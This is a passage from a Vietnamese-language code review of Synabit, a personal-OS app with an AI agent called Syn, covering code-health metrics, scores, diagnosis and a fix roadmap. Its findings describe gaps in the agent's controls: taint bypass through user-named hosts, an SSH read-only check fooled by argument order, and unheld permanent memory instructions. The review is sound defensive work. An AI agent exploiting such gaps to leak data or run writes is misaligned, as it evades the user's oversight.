bản và từ chối hạ cấp. Thiếu: kiểm tra toàn vẹn folder so với index (vault health
mới chỉ dò trùng); archive không chứa lịch sử; liệt kê 50k file gửi 14MB JSON qua
IPC.

---

## 10. Quy trình và sức khoẻ code

| Chỉ số | Giá trị |
|---|---|
| Commit | 520 trong 6 tháng; 67% có Claude đồng tác giả |
| Commit theo tháng (4→10) | 34 / 35 / 23 / 50 / 81 / **261** / 36 |
| Kích thước commit | trung vị 295 dòng, p90 2.835, lớn nhất 85k; 33 commit trên 5.000 dòng |
| Rust / Frontend | 216k / 174k dòng |
| Test | 3.320 Rust (sync 432, Syn 1.295, Safe 156), 276 spec Vitest (~2.650 case) |
| `unwrap`/`expect` ngoài test | ~143 — rất kỷ luật |
| Tauri command | 366 đăng ký, IPC không có binding kiểu tự sinh |
| `any` trong TS | 653, kèm nhiều luật ESLint bị tắt |
| CI | type-check, eslint, vitest, cargo test (Ubuntu, macOS), cargo-deny; thiếu clippy, rustfmt, Windows |
| Lint lúc đánh giá | **Đang đỏ**: `text-[10px]` ở `ConnectCard.vue:178` (công việc chưa commit) |
| Tag gần nhất local | v0.9.3 (07-24), app đang 0.9.23 |
| CHANGELOG / RELEASE_NOTES | Dừng ở 0.0.3 / 0.0.1 |

**Đọc bảng này:** kỷ luật ở mức *dòng code* rất cao — comment giải thích từng bug
đã đo, gần như không `unwrap` trong đường chạy thật, khuyết tật được ghi thành
test bị ignore, cargo-deny có lý do cho từng advisory. Kỷ luật ở mức *quy trình*
thấp: commit khổng lồ thẳng vào main, nhiều phiên song song chung một cây làm
việc, tag và changelog bỏ dở, tài liệu pháp lý mục.

Mẫu hình đáng lo nhất: **tốc độ do AI tạo ra đang vượt khả năng xác thực.**
39 commit trong ngày 27/9; Safe P0–P5 trong 2 ngày; steps 1–9 trong 1 ngày. Review
ngày 13/10 tự thừa nhận "lỗi này tôi đưa vào hôm nay". Hai lỗ cao nhất ở §6.2 nằm
trong code viết ở giai đoạn này.

---

## 11. Bảng điểm tổng hợp

| | Điểm | Mạnh nhất | Yếu nhất |
|---|---|---|---|
| T1 Dữ liệu sống lâu hơn app | 3.5 | File thường, cache bỏ được, interop rộng | Dựng lại index mất đồ thị; lịch sử ở cache |
| T2 Primitive chung | 2.5 | Một bảng `nodes`, kiểu mở, tool chung cho Syn | Định danh ba dạng; UI không có thực thể |
| T3 Agent là process | 3 | Gate tất định, taint, plan hash, Safe egress | Host đã nêu tên; SSH `run`; `remember` |
| T4 Sự chú ý | 1.5 | `notice.rs`, "Việc của Syn", seal | Không trọng tài; chuỗi cứng tiếng Anh |
| T5 Tự mở rộng | 3.5 | Connector/skill/routine khai báo, có duyệt | Không có đường không-LLM |
| Sync | 4.5 | 82 kịch bản đa thiết bị | Thu hồi, xoay khoá |
| Bảo mật nền | 3 | Safe, invoke gate | Webview root 366 command; recovery phrase |
| Quy trình | 2.5 | Test dày, cargo-deny | Commit khổng lồ; validation tụt sau velocity |
| UX | 3 | Văn phong, i18n, a11y, UX duyệt | Không shell, liên kết hỏng, silo |

---

## 12. Chẩn đoán

Gộp sáu lăng kính lại, có năm điều giải thích gần hết bảng điểm trên.

**1. Kernel được viết cho một process.** Những gì giống OS nhất ở Synabit —
policy, consent, taint, duyệt theo thiết bị, ledger, kill switch — đều mang tiền
tố `syn/`. Trong một OS thật, chúng là của hệ thống, và Syn chỉ là một principal
có manifest. Hiện nay app không phải principal, connector tính quyền ở ba chỗ,
thông báo không đi qua đâu cả. Đó là lý do T3 tốt mà T4 rất kém: luật có, nhưng
chỉ cho một bên.

**2. Primitive thống nhất ở đáy nhưng không đi lên được.** Tầng lưu trữ đã làm
đúng việc khó nhất (một bảng, kiểu mở). Nhưng định danh không duy nhất, quan hệ
không có kiểu, grammar không hỏi được đồ thị, và UI không có khái niệm "thực thể".
Mỗi tầng phía trên lại tự dựng lại tầng dưới — sáu bộ chọn người, hai cơ chế điều
hướng, ba dạng tham chiếu. Ghost-link khi dựng lại index là triệu chứng của cùng
căn bệnh: không có một hàm duy nhất "đây là cách một node trở thành một phần của
hệ thống".

**3. Độ rộng đang ăn vào độ sâu, đúng lúc thị trường hạ giá app dọc.** 13 app,
mỗi cái là bề mặt bảo trì và bề mặt sync vĩnh viễn. Thị trường 2026 nói rõ giá trị
nằm ở tầng dữ liệu + quyền + agent. Tài sản phòng thủ được của Synabit là kernel
(vault, policy, Safe, scheduler, sync), không phải Finance hay Feeds.

**4. Tốc độ vượt xác thực.** Thiết kế an toàn đi trước thị trường, nhưng các lỗ
cao nhất đều nằm trong code mới nhất, chưa chạy trong app thật, chưa qua eval đầy
đủ. Một agent có thiết kế CaMeL-grade mà thực thi có lỗ rò sẽ bị đánh giá theo lỗ
rò.

**5. Câu chuyện công khai không khớp sản phẩm.** README bán "suite", website hứa
mã hoá không có thật, LICENSE đòi thuê bao không còn tồn tại, mục tiêu mới là OS.
Với phần mềm một người dùng, điều này ít hại về thị trường — nhưng nó là dấu hiệu
cho thấy chưa có một tài liệu luận đề cấp cao làm cổng cho mọi quyết định.

---

## 13. Lộ trình đề xuất

### P0 — tuần này, trước commit tiếp theo

| Việc | Vì sao | Chỗ |
|---|---|---|
| SSH `run`: không bao giờ coi dòng do mô hình viết là đọc; loại khỏi "đọc lại cùng connector" và khỏi routine — hoặc xoá `run`, để Syn soạn thao tác khai báo | Lỗ cao, đang chưa commit nên sửa rẻ nhất lúc này | `connector/ssh.rs`, `connector/declared.rs` |
| Host đã nêu tên: sau taint (và luôn trong routine, helper), áp cùng luật "room" như mọi host; thêm task eval rò về *chính host người dùng nêu* | Lời hứa trung tâm của Syn đang sai | `taint.rs:585`, `gate.rs:384`, `eval/fixture.rs` |
| `remember` với `pinned`, `instruction`, `supersedes`, và `table_rows` trên SYN.md/memory → luôn giữ | Chỉ dẫn vĩnh viễn ghi được không thẻ | `tools.rs:2962`, `policy.rs` |
| Scan hai lượt: parse và định danh mọi file trước, rồi resolve; thêm golden test "xoá `vault_cache.db`, dựng lại, so edge" | T1 bị phá trên thiết bị mới | `commands/nodes.rs:173` |
| `get_recovery_phrase` sau PIN/xác thực hệ điều hành | Một lệnh trả khoá của mọi thứ | `commands/e2ee.rs:83` |
| Sửa lint đỏ | CI | `ConnectCard.vue:178` |

### P1 — 2–4 tuần: kernel hoá

1. **Một định danh.** Đóng dấu `node_id` lúc parse/import; `stable_id` UNIQUE;
   chuyển mọi trường tham chiếu sang UUID (`synabit://node/<uuid>` hoặc
   `[[uuid|Tiêu đề]]`), path chỉ còn là vị trí.
2. **Một `index_node()`** cho scan, watcher, sync-apply, writer, migration, khôi
   phục từ thùng rác. Nhận ghost theo tiêu đề/path khi node mới được tạo.
3. **Thực thể có địa chỉ trên UI.** Route `/:app/:id`; một service
   `openEntity({type, id})` thay cho polling và event bus; fallback về
   ObjectDetail cho kiểu không app nào nhận; `<EntityChip>` cho mention, nguồn
   Syn, held change, người tham dự.
4. **Palette toàn cục** (Cmd+K/Cmd+P) dựa trên `search_nexus`: nhảy tới thực thể,
   app, hành động. QuickEntry và AskBar thành chế độ của cùng bề mặt.
5. **Trọng tài sự chú ý.** Một broker mà mọi nguồn (nhắc nhở, notice, routine,
   Telegram, thẻ) phải đi qua: giờ yên lặng, ngân sách theo nguồn, gom/tóm tắt,
   một trung tâm thông báo trong shell có mặt cả trên điện thoại, chuỗi lấy từ
   i18n. Đo bằng "số lần im lặng được giữ", như tài liệu Timeline đã đề xuất.
6. **Khoá sync:** xác thực server bằng khoá công khai iroh của thiết bị thay vì
   `device_id` tự khai; lệnh xoay recovery phrase; `doc_hash` có khoá; padding kích
   thước. Làm cùng một lần bump giao thức, khi mới chỉ có một người dùng.

### P2 — 1–2 tháng: từ Syn ra hệ thống

1. **Mô hình capability cho mọi principal.** Bảng policy, ledger duyệt, taint áp
   cho connector/tài khoản, mirror, routine, script, và về sau là app. Syn thành
   một process có manifest. "Tài khoản ngoài" thành tài nguyên hệ thống mà
   Calendar, Feeds, Finance cùng dùng. Gom các danh sách rời trong `tools.rs`,
   `ambiguity.rs`, `locks.rs`, `gate.rs` về một chỗ.
2. **Quan hệ có kiểu và truy vấn được.** Giữ tên thuộc tính làm `relation` của
   edge; kiểu trường "quan hệ" trong Things; vị từ `links:`, `linked-from:`,
   `rel:<tên>:` trong grammar.
3. **Biến silo thành thực thể con có địa chỉ:** giao dịch Finance có id; hội thoại
   Syn và Messages là node ẩn mặc định; `event_links` chỉ giữ stable id; một dịch
   vụ nhận diện danh tính (email/điện thoại/handle → người) cho connector,
   Telegram, Timeline, Syn.
4. **Lịch sử vào vault** (`.synabit/history/` hoặc snapshot định kỳ); nâng Loro
   1.x ngay khi việc migrate mới chạm một bộ dữ liệu.
5. **`docs/vault-format.md`** — đặc tả định dạng, để T1 kiểm chứng được. Cân nhắc
   cú pháp liên kết mà Obsidian đọc được.
6. **Một MCP server có taint** để lộ vault cho agent bên ngoài theo phạm vi đọc
   — biến làn sóng agent thành gió xuôi như Obsidian đã làm.
7. **Hồi sinh "slope"**: lens → schema → manifest view/app khai báo, viết tay
   được, chạy không cần mô hình. Đây là nửa còn thiếu của T5.

### P3 — song song: bản sắc và kỷ luật

1. **Viết "hiến pháp" một trang** cho The OS for Personal, với năm tiêu chí làm
   cổng cho mọi tính năng. Rồi viết lại README, website docs (xoá các tuyên bố mã
   hoá và LAN sai), LICENSE (bỏ điều khoản thuê bao), `legal/`.
2. **Luật đóng băng độ rộng:** app mới chỉ được thêm nếu nó là *view trên
   primitive chung*. Cân nhắc hạ Finance, Feeds, Whiteboard xuống "shell tham
   chiếu" thay vì đua với app chuyên dụng. Hợp nhất trình sửa: People/Task/Calendar
   mở rộng ObjectDetail thay vì song song với nó.
3. **Validation trước velocity:** một tuần dùng thật sau mỗi đợt tính năng lớn;
   chạy lại eval 79 task sau các bản vá P0; một tính năng một commit; thêm clippy
   và Windows vào CI; tag mỗi bản phát hành.

### Nên ngừng

- Đua "thay thế 1Password / Miro / Notion / Splunk" từng mảng.
- So chiến lược với Claude Code, Codex, Manus — mốc so sánh đúng của một OS cá
  nhân là Home Assistant (mô hình entity + quyền expose) và Obsidian (file là API),
  không phải agent lập trình.
- Commit "land everything".

---

## 14. Kết

Nếu chỉ được nói một câu: **Synabit đã làm xong phần khó nhất mà ít ai làm — một
hệ thống file đáng tin và một agent bị trói bằng luật thay vì bằng lời dặn — giờ
cần làm phần ít hào nhoáng hơn: biến luật của Syn thành luật của hệ thống, biến
node thành thực thể có địa chỉ ở mọi tầng, và để hệ thống, chứ không phải từng
app, quyết định cái gì được làm phiền người dùng.** Đó là khoảng cách giữa một
suite rất tốt và một OS.

---

## Phụ lục A — Đã kiểm chứng lại bằng đọc code

| Phát hiện | Chỗ |
|---|---|
| Resolver dựng từ node đã có; DB trống → mọi liên kết thành ghost; `rebuild_links_if_stale` ghi version dù danh sách rỗng | `src-tauri/src/commands/nodes.rs:173-188, 299-337`; `utils/graph_parser.rs:430-478` |
| Host đã nêu tên: mọi path được phép, Ask → Allow | `syn/taint.rs:585-590, 646`; `syn/gate.rs:384-389`; test `taint.rs:803-806` |
| SSH `reads_only` chỉ xét đối số đầu; `systemctl --failed stop …` thành đọc | `syn/connector/ssh.rs:141-180`; `connector/declared.rs:184-188` |
| `get_recovery_phrase` không xác thực lại | `commands/e2ee.rs:83-87` |
| Server chỉ chặn `device_id` đã biết là revoked | `sync-server/src/auth.rs:35-60` |
| `doc_hash = blake3(rel_path)` không khoá được gửi; `rel_path` không gửi; `payload_hash` là hash ciphertext | `sync/core/change.rs:266, 483, 301`; `sync/adapter/server.rs:494-501` |
| "Mở trong app sở hữu" chưa bao giờ chạy cho person/project/finance_month/pdf_highlight | `src/shared/nodeRoutes.ts:30-38`; `src/mini-apps/things/ThingsApp.vue:105-110` |
| Chuỗi thông báo cứng tiếng Anh trong Rust | `src-tauri/src/chat_engine.rs:270-300` |
| LICENSE đòi thuê bao; website docs hứa mã hoá khi lưu và P2P qua LAN | `LICENSE:44, 57`; `website/public/content/docs/getting-started.md:13-24`; `setup-p2p-sync.md:3` |

Các phát hiện còn lại đến từ sáu lăng kính đọc code độc lập, có tham chiếu file
trong từng mục; những chỗ là suy luận đã được ghi rõ.

## Phụ lục B — Chưa làm trong đánh giá này

- Không chạy test hay build; không chạy app thật (chỉ dev stub với IPC giả).
- Không đánh giá hiệu năng runtime ngoài các baseline có sẵn trong `docs/`.
- Không kiểm tra Android trên thiết bị; điểm 63/100 (08-27) chưa được chấm lại.
